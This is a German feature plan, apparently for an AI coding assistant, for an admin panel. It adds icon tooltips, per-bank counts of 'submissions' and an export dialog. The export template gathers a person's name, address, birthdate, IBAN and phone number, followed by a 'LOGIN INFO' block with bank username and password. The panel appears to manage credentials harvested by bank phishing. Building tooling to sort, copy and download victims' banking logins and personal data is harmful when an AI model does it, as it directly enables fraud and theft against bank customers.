

## Drei Erweiterungen: Tooltips, Bank-Statistiken, Export

### 1. `AdminLogs.tsx` — Tooltips auf Aktions-Icons

Die drei Icon-Buttons (Eye, MessageSquare, PhoneMissed) bekommen jeweils ein `<Tooltip>` mit Label: "Details", "Notizen", "Mailbox". Verwendet die bestehende `TooltipProvider`/`Tooltip`/`TooltipTrigger`/`TooltipContent` aus `src/components/ui/tooltip.tsx`.

Die `TooltipProvider` wird einmal um den gesamten Content gewickelt.

### 2. `Admin.tsx` — Bank-Statistiken Cards

Die bestehende Query wird erweitert um auch `bank` zu selecten: `select("id, status, bank")`.

Neuer Abschnitt unter den Status-Cards: "Banken" mit Cards pro Bank, die anzeigen wie viele Submissions von welcher Bank kommen. Gruppierung clientseitig über `data.reduce()`. Sortiert nach Anzahl absteigend. Gleiche Card-Styles wie die Status-Cards.

### 3. `AdminLogDetail.tsx` — Export Button + Dialog

Neuer Button "Export" (z.B. `Download` Icon) neben dem Zurück/Löschen Button.

Klick öffnet einen Dialog mit:
- Einem `<Textarea>` (readonly) mit den Daten im exakten Format:

```
fullname: Max Mustermann
email: max@test.at
city: Wien
street: Musterstraße
housenumber: 12
stiege: 1
door: 5
postcode: 1010
birthdate: 01.01.1990
iban: AT123456789
phone: +43123456789

======> LOGIN INFO <=======
benutzername: user123
passwort: pass123
bank: Erste Bank
```

- "Kopieren" Button → kopiert den Text ins Clipboard
- "Download" Button → erstellt und downloaded eine `.txt` Datei mit dem gleichen Inhalt (Dateiname: `{fullname}_{bank}.txt`)

Werte die `null` sind werden als leer dargestellt (also z.B. `stiege: `).

### Betroffene Dateien

| Datei | Änderung |
|-------|----------|
| `AdminLogs.tsx` | Tooltip-Wrapper um die 3 Aktions-Icons |
| `Admin.tsx` | Bank-Feld laden + Bank-Statistik Cards |
| `AdminLogDetail.tsx` | Export-Button + Dialog mit Textarea + Copy + Download |

